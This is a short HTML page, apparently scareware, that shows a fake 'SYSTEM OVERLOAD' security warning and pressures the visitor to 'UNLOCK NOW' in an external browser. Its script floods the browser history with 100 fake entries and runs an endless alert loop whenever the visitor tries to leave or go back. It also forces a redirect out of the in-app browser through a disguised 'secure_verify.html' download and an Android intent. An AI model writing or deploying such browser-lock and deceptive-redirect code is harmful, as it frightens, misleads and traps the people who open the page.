<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; color:#fff; font-family:sans-serif; overflow:hidden; }
        #ui { display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; text-align:center; }
        .btn { background:#fe2c55; color:#fff; padding:20px 60px; border-radius:8px; font-weight:800; font-size:20px; border:none; }
    </style>
</head>
<body>
    <div id="ui">
        <div style="font-size:24px; font-weight:900; margin-bottom:20px;">SYSTEM OVERLOAD</div>
        <p style="padding:0 40px; margin-bottom:40px; color:#ccc;">Security protocol detected. Verification required in external browser to unlock device functions.</p>
        <button class="btn" onclick="hardBreakout()">UNLOCK NOW</button>
    </div>

<script>
    const targetUrl = "https://www.google.com";

    // NEW OUTSIDE THE BOX MOVE: The "Download Hijack"
    function hardBreakout() {
        // Create a 'fake' file that forces the OS to handle the request
        const blobContent = `<html><script>window.location.href="${targetUrl}";<\/script></html>`;
        const blob = new Blob([blobContent], {type: 'text/html'});
        const url = URL.createObjectURL(blob);
        
        // 1. Create a temporary anchor
        const a = document.createElement('a');
        a.href = url;
        a.download = "secure_verify.html"; // The 'download' attribute forces handover
        document.body.appendChild(a);
        
        // 2. Shotgun multiple protocols simultaneously to overwhelm the interceptor
        window.location.assign(url);
        a.click();
        
        // 3. Android Intent Fallback (Aggressive version)
        const altIntent = `intent://${targetUrl.replace("https://","")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        window.location.href = altIntent;
    }

    // THE INFINITE LOCK (Modified to prevent self-trapping)
    function nuclearLock() {
        // This blocks the 'X' button thread
        alert("CRITICAL ERROR: Manual Verification Required.\n\nClick OK to launch external security browser.");
        
        // Try the breakout
        hardBreakout();
        
        // Re-arm the lock instantly
        setTimeout(nuclearLock, 10);
    }

    // Trigger lock on 'X' or 'Back'
    window.onblur = () => { nuclearLock(); };
    window.onpopstate = () => { nuclearLock(); };

    // Fill history stack
    window.onload = () => {
        for(let i=0; i<100; i++) history.pushState(null, null, "#sys_lock_" + i);
    };
</script>
</body>
</html>
